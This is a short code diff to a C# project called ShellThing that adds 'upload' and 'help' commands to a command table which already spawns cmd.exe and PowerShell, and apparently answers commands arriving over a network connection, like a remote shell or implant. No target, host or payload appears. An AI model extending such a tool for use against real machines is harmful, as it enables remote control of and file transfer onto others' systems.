@@ -19,6 +19,8 @@ namespace ShellThing
             //commands.Add("systeminfo", new SystemInfoCommand());
             commands.Add("shell", new ShellSpawnCommand(@"cmd.exe"));
             commands.Add("powershell", new ShellSpawnCommand(@"powershell.exe"));
+            commands.Add("upload", new UploadCommand());
+            commands.Add("help", new HelpCommand());
             // Keep adding commands and their classes to the hashtable here
         }
 
@@ -37,7 +39,7 @@ namespace ShellThing
                 // Cast the object from the hashtable to an ICommand for execution
                 ExecuteCommand((ICommand)commands[command], commandSplit);
             }
-            catch (NullReferenceException e)
+            catch (NullReferenceException)
             {
                 connection.SendData($"Invalid Command: {commandFullString}\n");
             }
